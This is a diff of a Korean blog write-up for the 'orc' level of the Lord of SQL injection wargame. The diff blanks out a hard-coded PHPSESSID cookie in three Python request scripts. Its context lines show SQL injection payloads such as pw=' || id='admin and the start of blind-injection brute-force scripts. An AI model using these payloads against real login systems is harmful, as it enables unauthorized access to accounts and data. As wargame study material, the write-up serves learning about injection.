@@ -9,8 +9,6 @@ grand_parent: P4C
 
 ##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다
 -----
-.
-
 # > Lord of Sql injection: orc
 
 ## 삽질
@@ -50,7 +48,7 @@ pw를 맞추어야 하는 것을 보니 이전 문제처럼 단순히 1번의 �
 
 ```python
 import requests
-cookie = {'PHPSESSID':'timor8st6kt5bc5iblpcdm225b'}
+cookie = {'PHPSESSID':''}
 flag = 1
 
 def my_request(upw):
@@ -211,7 +209,7 @@ pw=' || id='admin
 
 ```python
 import requests
-cookie = {'PHPSESSID':'timor8st6kt5bc5iblpcdm225b'}
+cookie = {'PHPSESSID':''}
 flag = 1
 
 def my_request(upw):
@@ -415,7 +413,7 @@ pw=1' or id='admin' --+
 
 ```python
 import requests
-cookie = {'PHPSESSID':'timor8st6kt5bc5iblpcdm225b'}
+cookie = {'PHPSESSID':''}
 flag = 1
 
 def my_request(upw):
